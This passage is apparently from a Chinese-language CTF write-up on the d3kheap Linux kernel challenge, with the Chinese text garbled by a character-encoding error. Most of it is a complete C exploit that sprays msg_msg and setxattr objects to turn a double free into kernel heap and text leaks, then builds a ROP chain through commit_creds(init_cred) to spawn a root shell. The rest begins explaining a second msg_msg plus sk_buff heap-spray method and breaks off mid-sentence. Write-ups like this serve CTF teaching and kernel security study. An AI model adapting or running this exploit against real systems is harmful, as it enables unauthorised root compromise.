class="hljs-title">next</span>, *<span class="hljs-title">prev</span>;</span><br>&#125;;<br> <br><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">long</span> m_type;<br>    <span class="hljs-type">size_t</span> m_ts;        <span class="hljs-comment">/* message text size */</span><br>    <span class="hljs-type">void</span> *next;         <span class="hljs-comment">/* struct msg_msgseg *next; */</span><br>    <span class="hljs-type">void</span> *security;     <span class="hljs-comment">/* NULL without SELinux */</span><br>    <span class="hljs-comment">/* the actual message follows immediately */</span><br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> *buf;<br>    <span class="hljs-type">size_t</span> kernel_heap_leak = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">size_t</span> kernel_heap_search = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">size_t</span> kernel_text_leak = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">size_t</span> page_offset_base_guess = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">size_t</span> msg_offset, msg_offset_count;<br>    <span class="hljs-type">size_t</span> fake_ops_addr, fake_ops_offset, kmsg_addr;<br>    <span class="hljs-type">int</span> kmsg_idx;<br>    <span class="hljs-type">int</span> ms_qid[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-type">int</span> rop_idx;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    saveStatus();<br><br>    buf = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4000</span>);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x4000</span>);<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/d3kheap&quot;</span>, O_RDONLY);<br><br>    add();<br><br>    del();<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)<br>    &#123;<br>        ms_qid[i] = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT);<br>        <span class="hljs-keyword">if</span> (ms_qid[i] &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] msgget!&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;A&#x27;</span> + i, <span class="hljs-number">0X1000</span> - <span class="hljs-number">8</span>);<br>        ret = msgsnd(ms_qid[i], buf, <span class="hljs-number">1024</span> - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] msgsnd!&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br><br>    del();<br><br>    <span class="hljs-comment">// leak msg_queue addr from heap</span><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-number">0x1000</span> - <span class="hljs-number">8</span>);<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="hljs-number">0x1000</span> - <span class="hljs-number">0x30</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;next = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="hljs-literal">NULL</span>;<br><br>    setxattr(<span class="hljs-string">&quot;/tmp/exp&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, buf, <span class="hljs-number">1024</span> - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>);<br><br>    ret = msgrcv(ms_qid[<span class="hljs-number">0</span>], buf, <span class="hljs-number">0x1000</span> - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] msgrcv!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ((<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x30</span>) / <span class="hljs-number">8</span>); i++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[----data dump----][%d] %p\n&quot;</span>, i, buf[i]);<br>        <span class="hljs-keyword">if</span> (((buf[i] &amp; <span class="hljs-number">0xffff000000000000</span>) == <span class="hljs-number">0xffff000000000000</span>) &amp;&amp; !kernel_heap_leak &amp;&amp; (buf[i + <span class="hljs-number">3</span>] == (<span class="hljs-number">1024</span> - <span class="hljs-number">0x30</span>)))<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] We got heap leak! kheap: %p\n&quot;</span>, buf[i]);<br>            kernel_heap_leak = buf[i];<br>            kmsg_idx = (<span class="hljs-type">int</span>)(((<span class="hljs-type">char</span>*)(&amp;buf[i + <span class="hljs-number">2</span>]))[<span class="hljs-number">0</span>] - <span class="hljs-string">&#x27;A&#x27;</span>);<br>            fake_ops_offset = i * <span class="hljs-number">8</span> + <span class="hljs-number">0x30</span> - <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (((buf[i] &amp; <span class="hljs-number">0xffffffff00000000</span>) == <span class="hljs-number">0xffffffff00000000</span>) &amp;&amp; !kernel_text_leak)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] We got text leak! ktext: %p\n&quot;</span>, buf[i]);<br>            kernel_offset = kernelLeakQuery(buf[i]);<br>            <span class="hljs-keyword">if</span> (kernel_offset != <span class="hljs-number">0xdeadbeef</span>)<br>            &#123;<br>                kernel_text_leak = buf[i];<br>                kernel_base += kernel_offset;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (kernel_text_leak &amp;&amp; kernel_heap_leak)<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!kernel_heap_leak)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Failed to leak kernel heap!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// leak msg_msg addr</span><br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="hljs-number">0x2000</span> - <span class="hljs-number">0x30</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;next = kernel_heap_leak - <span class="hljs-number">8</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="hljs-literal">NULL</span>;<br><br>    setxattr(<span class="hljs-string">&quot;/tmp/exp&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, buf, <span class="hljs-number">0x2e0</span>, <span class="hljs-number">0</span>);<br><br>    ret = msgrcv(ms_qid[<span class="hljs-number">0</span>], buf, <span class="hljs-number">0x2000</span> - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] msgrcv!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    kmsg_addr = buf[(<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x30</span>) / <span class="hljs-number">8</span> + <span class="hljs-number">1</span>];<br>    <span class="hljs-comment">/*puts(&quot;[*] leaking...&quot;);</span><br><span class="hljs-comment">    for (int i = (0x1000 - 0x30) / 8; i &lt; (0x2000 - 0x30) / 8 ; i++)</span><br><span class="hljs-comment">        printf(&quot;[----data dump----] %d: %p\n&quot;, i, buf[i]);*/</span><br>    fake_ops_addr = kmsg_addr - fake_ops_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] UAF as fake ops addr at: %p, cal by msg idx: %d at addr: %p\n&quot;</span>, fake_ops_addr, kmsg_idx, kmsg_addr);<br><br>    <span class="hljs-comment">// leak kernel text base if we didn&#x27;t leak it before</span><br>    kernel_heap_search = kmsg_addr - <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> leaking_times = <span class="hljs-number">0</span>; !kernel_text_leak; leaking_times++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] per leaking, no.%d time(s)\n&quot;</span>, leaking_times);<br>    <br>        ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = <span class="hljs-literal">NULL</span>;<br>        ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = <span class="hljs-literal">NULL</span>;<br>        ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="hljs-literal">NULL</span>;<br>        ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="hljs-number">0x2000</span> - <span class="hljs-number">0x30</span>;<br>        ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;next = kernel_heap_search;<br>        ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="hljs-literal">NULL</span>;<br><br>        setxattr(<span class="hljs-string">&quot;/tmp/exp&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, buf, <span class="hljs-number">0x2e0</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Now searching: %p\n&quot;</span>, kernel_heap_search);<br><br>        ret = msgrcv(ms_qid[<span class="hljs-number">0</span>], buf, <span class="hljs-number">0x2000</span> - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] msgrcv!&quot;</span>);<br>            kernel_heap_search += <span class="hljs-number">0x1000</span> - <span class="hljs-number">8</span>;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        msg_offset_count = <span class="hljs-number">0</span>;<br>        msg_offset = <span class="hljs-number">0xdeadbeefbad4f00d</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x30</span>) / <span class="hljs-number">8</span>; i &lt; (<span class="hljs-number">0x2000</span> - <span class="hljs-number">0x30</span>) / <span class="hljs-number">8</span>; i++)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[----data dump----][%d] %p\n&quot;</span>, i, buf[i]);<br>            <span class="hljs-keyword">if</span> ((buf[i] &gt; <span class="hljs-number">0xffffffff81000000</span>) &amp;&amp; (buf[i] &lt; <span class="hljs-number">0xffffffffbfffffff</span>) &amp;&amp; !kernel_text_leak)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] We got text leak! ktext: %p\n&quot;</span>, buf[i]);<br>                kernel_offset = kernelLeakQuery(buf[i]);<br>                <span class="hljs-keyword">if</span> (kernel_offset != <span class="hljs-number">0xdeadbeef</span>)<br>                &#123;<br>                    kernel_text_leak = buf[i];<br>                    kernel_base += kernel_offset;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (!buf[i])<br>                msg_offset = msg_offset_count * <span class="hljs-number">8</span>;<br>            msg_offset_count++;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (kernel_text_leak)<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">if</span> (msg_offset == <span class="hljs-number">0xdeadbeefbad4f00d</span>)<br>        &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] Failed to find next valid foothold!&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>        kernel_heap_search += msg_offset; <span class="hljs-comment">// to make the msg_msg-&gt;next == NULL, search from the last NULL</span><br>    &#125;<br><br>leak_out:<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel base: %p\n&quot;</span>, kernel_base);<br><br>    <span class="hljs-comment">// comfortably double free like A-&gt;B-&gt;A, its checking is as simple as the fastbin in ptmalloc2</span><br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_list.next = kernel_heap_search; <span class="hljs-comment">// a pointer to the heap is available, list_del (aka unlink) is easy to pass</span><br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_list.prev = kernel_heap_search;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_type = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;m_ts = <span class="hljs-number">1024</span> - <span class="hljs-number">0x30</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;next = <span class="hljs-literal">NULL</span>;<br>    ((<span class="hljs-keyword">struct</span> msg_msg*) buf)-&gt;security = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">// while the kmem_cache-&gt;offset is not 0, we can easily repair the header of msg_msg</span><br>    setxattr(<span class="hljs-string">&quot;/tmp/exp&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, buf, <span class="hljs-number">0x2e0</span>, <span class="hljs-number">0</span>);<br><br>    ret = msgrcv(ms_qid[kmsg_idx], buf, <span class="hljs-number">1024</span> - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>, IPC_NOWAIT | MSG_NOERROR); <span class="hljs-comment">// add a obj to pass detection in set_freepointer() in free_msg</span><br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] msgrcv!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    ret = msgrcv(ms_qid[<span class="hljs-number">0</span>], buf, <span class="hljs-number">1024</span> - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>, IPC_NOWAIT | MSG_NOERROR); <span class="hljs-comment">// constructing A-&gt;B-&gt;A</span><br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] msgrcv!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// regain UAF</span><br>    pipe(pipe_fd);<br>    pipe_fd_1 = pipe_fd[<span class="hljs-number">1</span>];<br><br>    pipe(pipe_fd2);<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-number">0x1000</span>);<br>    buf[<span class="hljs-number">2</span>] = fake_ops_addr;<br>    buf[<span class="hljs-number">1</span>] = <span class="hljs-number">0xffffffff812dbede</span> + kernel_offset; <span class="hljs-comment">// push rsi ; pop rsp ; pop 4 val ; ret</span><br><br>    <span class="hljs-comment">// construct ROP</span><br>    rop_idx = <span class="hljs-number">4</span>;<br>    buf[rop_idx++] = POP_RDI_RET + kernel_offset;<br>    buf[rop_idx++] = INIT_CRED + kernel_offset;<br>    buf[rop_idx++] = COMMIT_CREDS + kernel_offset;<br>    buf[rop_idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="hljs-number">0x16</span> + kernel_offset;<br>    buf[rop_idx++] = *(<span class="hljs-type">size_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    buf[rop_idx++] = *(<span class="hljs-type">size_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    buf[rop_idx++] = getRootShell;<br>    buf[rop_idx++] = user_cs;<br>    buf[rop_idx++] = user_rflags;<br>    buf[rop_idx++] = user_sp;<br>    buf[rop_idx++] = user_ss;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fake ops: %p, gadget: %p\n&quot;</span>, buf[<span class="hljs-number">2</span>], buf[<span class="hljs-number">1</span>]);<br>    setxattr(<span class="hljs-string">&quot;/tmp/exp&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, buf, <span class="hljs-number">0x2e0</span>, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">//    sleep(5);</span><br><br>    <span class="hljs-comment">// trigger</span><br>    close(pipe_fd[<span class="hljs-number">0</span>]);<br>    close(pipe_fd[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[?] YOU FAILED? zen me hui shi ne?&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸ä¸€å®šæ¯æ¬¡éƒ½èƒ½æˆåŠŸï¼ˆç”±äºå¼€äº† freelist éšæœºåŒ–çš„ç¼˜æ•…ï¼Œæˆ‘ä»¬å¹¶ä¸èƒ½ä¿è¯è¿›è¡Œ UAF çš„ object å¾€é«˜åœ°å€ä¸€å®šä¼šæœ‰ msg_msg ç»“æ„ä½“ï¼‰ï¼Œä½†æ˜¯ç»ç¬”è€…å®æµ‹æˆåŠŸç‡è¿˜æ˜¯ä¸ä½çš„</p><p><img src="https://s2.loli.net/2022/02/25/SXBzMHaNqKLmPTG.png" alt="image.png"></p><h2 id="è§£æ³•äºŒï¼šmsg-msg-sk-buff-å †å–·">è§£æ³•äºŒï¼šmsg_msg + sk_buff å †å–·</h2><h3 id="Step-I-å †å–·-msg-msg-ï¼Œå»ºç«‹ä¸»ä»æ¶ˆæ¯é˜Ÿåˆ—">Step.I å †å–· <code>msg_msg</code> ï¼Œå»ºç«‹ä¸»ä»æ¶ˆæ¯é˜Ÿåˆ—</h3><p>æ—¢ç„¶æˆ‘ä»¬ç°åœ¨æœ‰äº†ä¸€ä¸ªUAFçš„æœºä¼šï¼Œé‚£ä¹ˆé€‰ç”¨ä»€ä¹ˆæ ·çš„ç»“æ„ä½“ä½œä¸º victim å‘¢ï¼Ÿè¿™é‡Œæˆ‘ä»¬é€‰æ‹©ä½¿ç”¨ <code>msg_msg</code> è¿™ä¸€ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br><span class="hljs-type">long</span> m_type;<br><span class="hljs-type">size_t</span> m_ts;<span class="hljs-comment">/* message text size */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-comment">/* the actual message follows immediately */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬åœ¨ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€å¤šä¸ªæ¶ˆæ¯æ—¶ï¼Œä¼šå½¢æˆå¦‚ä¸‹ç»“æ„ï¼š</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸€å¼€å§‹æ—¶å…ˆé€šè¿‡ d3kheap è®¾å¤‡æä¾›çš„åŠŸèƒ½å…ˆè·å–ä¸€ä¸ª object åé‡Šæ”¾ï¼Œä¹‹åå †å–·å¤šä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¹¶åˆ†åˆ«åœ¨æ¯ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€ä¸¤æ¡æ¶ˆæ¯ï¼Œå½¢æˆå¦‚ä¸‹å†…å­˜å¸ƒå±€ï¼Œè¿™é‡Œä¸ºäº†ä¾¿åˆ©åç»­åˆ©ç”¨ï¼Œç¬¬ä¸€æ¡æ¶ˆæ¯ï¼ˆä¸»æ¶ˆæ¯ï¼‰çš„å¤§å°ä¸º 96ï¼Œç¬¬äºŒæ¡æ¶ˆæ¯ï¼ˆè¾…åŠ©æ¶ˆæ¯ï¼‰çš„å¤§å°ä¸º 0x400ï¼š</p><p><img src="https://s2.loli.net/2022/03/31/ViAM3gDxpl1kQj9.png" alt="image.png"></p><p>æ­¤æ—¶<strong>æˆ‘ä»¬çš„è¾…åŠ©æ¶ˆæ¯ä¾¿æœ‰æå¤§çš„æ¦‚ç‡è·å–åˆ°ä¹‹å‰é‡Šæ”¾çš„ object</strong></p><blockquote><p>åˆ©ç”¨ <code>MSG_COPY</code> æ ‡å¿—ä½å¯ä»¥è¯»å–æ¶ˆæ¯é˜Ÿåˆ—ä¸Šçš„æ¶ˆæ¯è€Œä¸é‡Šæ”¾ï¼Œå‚è§<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">è¿™é‡Œ</a></p></blockquote><h3 id="Step-II-æ„é€ -UAFï¼Œå †å–·-sk-buff-å®šä½-victim-é˜Ÿåˆ—">Step.II æ„é€  UAFï¼Œå †å–· <code>sk_buff</code> å®šä½ victim é˜Ÿåˆ—</h3><p>æ­¤æ—¶æˆ‘ä»¬ç›´æ¥åˆ©ç”¨é¢˜ç›®çš„åŠŸèƒ½å°†è¾…åŠ©æ¶ˆæ¯é‡Šæ”¾æ‰ï¼Œä¾¿èƒ½æˆåŠŸå®Œæˆ UAF çš„æ„å»ºï¼Œæ­¤æ—¶<strong>æˆ‘ä»¬ä»èƒ½é€šè¿‡å…¶ä¸­ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—è®¿é—®åˆ°è¯¥è¾…åŠ©æ¶ˆæ¯å¯¹åº” objectï¼Œä½†å®é™…ä¸Šè¿™ä¸ª object å·²ç»åœ¨ freelist ä¸Šäº†</strong></p><p><img src="https://s2.loli.net/2022/05/17/sCflaOFvMSzhGUV.png" alt="image.png"></p><p>ä½†æ­¤æ—¶æˆ‘ä»¬æ— æ³•å¾—çŸ¥æ˜¯å“ªä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—å‘½ä¸­äº† UAF objectï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬é€‰ç”¨ <code>sk_buff</code> å †å–·åŠ«æŒè¯¥ç»“æ„ä½“</p><p>ç±»ä¼¼äº <code>msg_msg</code>ï¼Œå…¶åŒæ ·å¯ä»¥æä¾›è¿‘ä¹ä»»æ„å¤§å°å¯¹è±¡çš„åˆ†é…å†™å…¥ä¸é‡Šæ”¾ï¼Œä½†ä¸åŒçš„æ˜¯ <code>msg_msg</code> ç”±ä¸€ä¸ª header åŠ ä¸Šç”¨æˆ·æ•°æ®ç»„æˆï¼Œè€Œ <code>sk_buff</code> æœ¬èº«ä¸åŒ…å«ä»»ä½•ç”¨æˆ·æ•°æ®ï¼Œ<strong>ç”¨æˆ·æ•°æ®å•ç‹¬å­˜æ”¾åœ¨ä¸€ä¸ª object å½“ä¸­ï¼Œè€Œ sk_buff ä¸­å­˜æ”¾æŒ‡å‘ç”¨æˆ·æ•°æ®çš„æŒ‡é’ˆ</strong></p><p><img src="https://s2.loli.net/2022/03/31/AV8HsnZj2bUCl4J.png" alt="image.png"></p><p>è‡³äºè¿™ä¸ªç»“æ„ä½“çš„åˆ†é…ä¸é‡Šæ”¾ä¹Ÿæ˜¯ååˆ†ç®€å•ï¼Œ<strong>sk_buff åœ¨å†…æ ¸ç½‘ç»œåè®®æ ˆä¸­ä»£è¡¨ä¸€ä¸ªã€ŒåŒ…ã€ï¼Œ<strong>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯</strong>æˆ‘ä»¬åªéœ€è¦åˆ›å»ºä¸€å¯¹ socketï¼Œåœ¨ä¸Šé¢å‘é€ä¸æ¥æ”¶æ•°æ®åŒ…å°±èƒ½å®Œæˆ sk_buff çš„åˆ†é…ä¸é‡Šæ”¾</strong>ï¼Œæœ€ç®€å•çš„åŠæ³•ä¾¿æ˜¯ç”¨ socketpair ç³»ç»Ÿè°ƒç”¨åˆ›å»ºä¸€å¯¹ socketï¼Œä¹‹åå¯¹å…¶ read &amp; write ä¾¿èƒ½å®Œæˆæ”¶å‘åŒ…çš„å·¥ä½œ</p><p>é‚£ä¹ˆæˆ‘ä»¬åˆ©ç”¨ <code>sk_buff</code> å †å–·å‘è¿™ä¸ª UAF object ä¸­å†™å…¥ä»€ä¹ˆæ•°æ®å‘¢ï¼Ÿå…¶å®è¿™é‡Œæˆ‘ä»¬å¯ä»¥éšä¾¿å†™å…¥ä¸€äº›å†…å®¹ï¼Œä¹‹åæˆ‘ä»¬ä½¿ç”¨ <code>MSG_COPY</code> flag è¿›è¡Œæ¶ˆæ¯æ‹·è´æ—¶ä¾¿ä¼šå¤±è´¥ï¼Œä½†ä¸ä¼š kernel panicï¼Œ<strong>å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ¤æ–­æ˜¯å¦è¯»å–æ¶ˆæ¯å¤±è´¥æ¥å®šä½å‘½ä¸­ UAF çš„æ¶ˆæ¯é˜Ÿåˆ—</strong></p><h3 id="Step-III-å †å–·-sk-buff-ä¼ªé€ è¾…åŠ©æ¶ˆæ¯ï¼Œæ³„éœ²-UAF-obj-åœ°å€">Step.III å †å–· <code>sk_buff</code> ä¼ªé€ è¾…åŠ©æ¶ˆæ¯ï¼Œæ³„éœ² UAF obj åœ°å€</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘å¦‚ä½•ç»§ç»­åˆ©ç”¨è¿™ä¸ª UAFï¼Œç”±äºå…¶ä½äºæ¶ˆæ¯é˜Ÿåˆ—ä¸Šï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ¶ˆæ¯é˜Ÿåˆ—çš„æ€§è´¨æ¥å®Œæˆåˆ©ç”¨</p><p>é¦–å…ˆæˆ‘ä»¬è€ƒè™‘å¦‚ä½•é€šè¿‡ä¼ªé€  <code>msg_msg</code> ç»“æ„ä½“å®Œæˆä¿¡æ¯æ³„éœ²ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯å¯ä»¥ä¼ªé€ ä¸€ä¸ª <code>msg_msg</code> ç»“æ„ä½“ï¼Œå°†å…¶ <code>m_ts</code> 